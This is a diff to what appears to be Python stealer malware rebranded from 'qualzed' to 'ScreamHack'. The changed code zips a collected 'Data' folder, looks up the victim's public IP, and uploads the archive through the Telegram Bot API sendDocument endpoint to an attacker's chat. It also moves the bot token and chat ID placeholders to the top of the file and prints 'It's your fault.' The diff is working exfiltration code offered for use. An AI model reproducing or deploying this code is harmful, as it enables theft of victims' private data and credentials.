@@ -1,3 +1,6 @@
+token = "YOUR BOT TOKEN" #YOUR TOKEN HERE
+chat_id = "YOUR CHAT ID" #YOUR CHAT ID HERE
+
 import os
 import sqlite3
 import zipfile
@@ -168,18 +171,16 @@ if __name__ == "__main__":
     zipload.close()
 
     zipPath = os.path.join(path_main, "Data" + ".zip")
-    token = "YOUR TOKEN HERE" #YOUR TOKEN HERE
-    chat_id = "YOUR CHAT ID HERE" #YOUR CHAT ID HERE
 
     proxy_array = ["95.152.0.16:3128"]
-    data = {'chat_id': chat_id}
+    SendData = {'chat_id': chat_id}
 
     r = requests
     files = {'document': open(zipPath, 'rb')}
 
     bot = telebot.TeleBot(token)
-    bot.send_message(chat_id, "By qualzed: " + "\n" + "IP: " + requests.get('https://api.ipify.org').text)
-    response = r.post("https://api.telegram.org/bot" + token + "/sendDocument", files=files, data=data)
+    bot.send_message(chat_id, "ScreamHack: " + "\n" + "IP: " + requests.get('https://api.ipify.org').text)
+    response = r.post("https://api.telegram.org/bot" + token + "/sendDocument", files=files, data=SendData)
 
 print("It's your fault.")
 input()
